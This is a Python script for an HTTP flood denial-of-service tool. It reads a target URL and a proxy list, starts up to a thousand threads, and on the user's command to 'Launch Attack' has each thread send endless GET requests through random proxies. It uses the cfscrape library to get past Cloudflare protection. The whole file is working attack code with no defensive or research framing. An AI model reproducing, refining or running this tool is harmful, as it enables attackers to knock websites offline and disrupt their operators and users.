import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(a+1) + " Created ")
	print(Fore.RED + "Wait 20 Seconds For Threads Ready To Attack ...")
	time.sleep(20)
	input(Fore.CYAN + "Press Enter To Launch Attack !")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input(Fore.GREEN + "Url : " + Fore.WHITE))
	list = str(input(Fore.GREEN + "List (proxy.txt) : " + Fore.WHITE))
	pprr = open(list).readlines()
	print(Fore.GREEN + "Proxies Count : " + Fore.WHITE + "%d" %len(pprr))
	thr = int(input(Fore.GREEN + "Threads (1-1000 Default Is 400) : " + Fore.WHITE))
	per = int(input(Fore.GREEN + "Power (1-100 Default Is 70) : " + Fore.WHITE))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(10)
	while True:
		while oo:
			try:
				s.get(url)
				print(Fore.CYAN + 'PROXY ----> ' + Fore.WHITE +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]) +Fore.CYAN+ ' ---> Bypass 1 ---> ' +Fore.GREEN + str(url) )
				try:
					for g in range(per):
						s.get(url)
						print(Fore.CYAN + 'PROXY ---> ' + Fore.WHITE +Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) +Fore.CYAN+ ' --> Bypass 2 --> ' +Fore.GREEN + str(url) ) 
					#s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "Can't Connect To Proxies Or Url !")


if __name__ == "__main__":
	main()
